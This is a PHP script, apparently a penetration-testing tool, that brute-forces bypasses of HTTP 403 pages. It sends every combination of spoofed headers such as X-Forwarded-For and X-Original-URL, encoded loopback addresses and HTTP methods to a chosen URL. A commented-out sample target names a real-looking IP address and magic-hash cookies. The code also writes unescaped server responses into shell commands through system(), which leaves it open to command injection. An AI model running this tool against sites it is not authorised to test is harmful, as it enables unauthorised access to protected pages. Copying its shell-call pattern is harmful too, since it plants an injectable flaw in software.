<?php
			// by omar alahmadi 
    $url = readline("enter URL : "); //input for URL
    readline_add_history($url); //save input 
    $Cookie = readline("add Cookie ex : username=test; role=admin;  OR enter to skip"); //input for cookie
    readline_add_history($Cookie); //save input
    $ch =" ";
    $status = false;

    //  //if you want to test this tool uncomment this two line  below <------------------------------
    // $url = "http://52.28.216.196/skiddy/robots.txt.php";   // <===========
    // $Cookie ="flag=240610708; flag1=QNKCDZO";             // <============

    $headerList = [
        'Referer',
        'X-Custom-IP-Authorization',
        'X-Forwarded-For',
        'X-rewrite-url',
	    'X-Original-URL',
        "X-Originating-IP",
        "X-Forwarded",
        "Forwarded-For",
        "X-Remote-IP",
        "X-Remote-Addr",
        "Client-IP",
        "True-Client-IP",
        "Cluster-Client-IP",
        "X-ProxyUser-Ip",
        "Host"
    ];
$ips = [
    "127.0.0.1",
    "http://127.0.0.1",
    "::ffff:7f00:0001",
    "http://::ffff:7f00:0001",
    "0000:0000:0000:0000:0000:ffff:7f00:0001",
    "http://0000:0000:0000:0000:0000:ffff:7f00:0001",
    "2130706433",
    "http://2130706433",
    "0x7F000001",
    "http://0x7F000001",
    "localhost",
    "http://localhost",
    "[::1]",
    "::1",
    "::",
    "http://0/",
    "http://127.1/",
    "http://127.0.1/",
    "http://127.127.127.127/",
    "http://127.0.1.3/",
    "http://127.0.0.0/",
    "http://[::]:80/",
    "http://0000:80/::1/",
    "https://127.0.0.1/",
    "https://localhost/",
    "$url",
    "/admin"
];
    $methods=[ 
        'POST' => CURLOPT_POST,
        'GET' => CURLOPT_HTTPGET,
        'PUT' => CURLOPT_PUT,
        // 'HEAD' => CURLOPT_HEADER,
        'OPTIONS' => " ",
        "PATCH" => " ",
    ];
foreach ($headerList as $header){
   foreach ($ips as $ip) {
       foreach ($methods as $key => $method) {
           $ch = curl_init($url);
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
           curl_setopt($ch, CURLOPT_HEADER, false);
           curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $key);
           curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                    'Cache-Control: max-age=0',
                                    $header.':'.$ip,
                                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.19 Safari/537.36 Edg/91.0.864.11',
                                    !isset($Cookie) ?:'Cookie:'.$Cookie,
                                    'Connection: close',
                                    ));
           curl_setopt($ch, CURLOPT_URL, $url);
           $result = curl_exec($ch);

           $pos = strpos($result, 'Forbidden');
    
           echo "\n trying : ".$key." : \033[33m $header : $ip  \033[0m\n";
           if ($pos != true) {
               echo " \n \n found method : $key  and Request header : \033[32m$header : $ip \033[0m\n";
               printf("\033[36m $result \033[0m\n");
               @system(" echo 'found method : $key  and Request header : $header : $ip' > bypassResult.txt ");
               @system(" echo ' \n \n $result' >> bypassResult.txt ");
               curl_close($ch);
               $status = true;
           }
       }
   }
}if($status == false){
    echo "\033[31m sorry i tried hard but i didn't found anything \033[0m\n";
}
